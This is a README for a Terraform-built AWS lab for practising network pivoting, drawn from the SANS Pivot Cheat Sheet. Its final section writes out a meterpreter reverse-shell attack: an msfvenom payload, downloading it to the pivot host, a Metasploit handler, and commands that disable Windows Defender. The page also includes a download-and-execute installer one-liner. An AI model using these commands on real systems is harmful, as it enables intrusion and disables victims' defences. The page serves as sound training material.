# SANS Pivot Cheat Sheet Lab
This serves as a tool for cybersecurity enthusiasts to better understand pivoting through an environment. The central reference is the [SANS Pivot Cheat Sheet](https://www.sans.org/posters/pivot-cheat-sheet/). Some code used from Terraform's [HashiCorp Learn platform](https://learn.hashicorp.com/tutorials/terraform/cloud-init?in=terraform/provision).

## Dependencies
- [AWS IAM Credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) to interact with an AWS account
- [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html) installed
- [Terraform](https://www.terraform.io/downloads.html) installed

## Files
- Readme.md:    This file explains the repository
- main.tf:      Overall architecture of the Terraform project
- variables.tf: Contains values used in production
- output.tf:    Defines outputs requested from the build
- scripts/:     YAML config files for instances
- assets/:      Files copied to instances

## Steps
### Create Keys and Apply to YAML Configs
- `ssh-keygen -t rsa -C "your_email@example.com" -f ../tf-cloud-init`
- Look for `ssh_authorized_keys:` in the YAML files in `scripts/`. Replace the example public keys with the contents of your new `tf-cloud-init.pub`.

### Create the Range with Terraform
```
$ terraform init
[...]
Terraform has been successfully initialized!
[...]
$ terraform fmt
$ terraform validate
Success! The configuration is valid.
$ terraform apply
[...]
Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes
[...]
Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
$ terraform show
```

### Optionally: Create a Windows Instance as Another Pivot
- From the AWS Console, Create Instance
- Pick a Windows AMI - maybe 2019 (ami-0428fc1ee1bde045a)
- Next, then t2micro might be OK
- Next, then VPC from the Terraform output
- Set Auto-Assign IP to Enable
- Set Primary IP addresses to 10.1.2.2
- Next
- Next, then add tags like "Project:PivotPlay" and "Name:Windows-Pivot"
- Next, then pick the sg_pivot security group
- Review, then Launch
- Create a new key and save them
- Once the new instance is up, select it in the Instances view and Connect using the key you just created

### Optional Windows Steps
- Install chocolatey package manager: `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))`
- Install Nmap or other tools: `choco install nmap`

### Connect to the Attack Machine with the IP from the Previous Command
- `ssh attack@AttackIPHere -i ../tf-cloud-init`

### Maybe Perform some attacks!
- `attack $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8888 -f exe -o helper.exe`
- `pivot PS> curl 10.1.1.1:8000/helper.exe -OutFile helper.exe`
- `attack $ msfconsole`
- `attack msf6> use exploit/multi/handler`
- `attack msf6> set payload windows/x64/meterpreter/reverse_tcp`
- `attack msf6> set LHOST eth0`
- `attack msf6> set LPORT 8888`
- `attack msf6> run`
- `pivot PS> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend`
- `pivot PS> .\helper.exe`
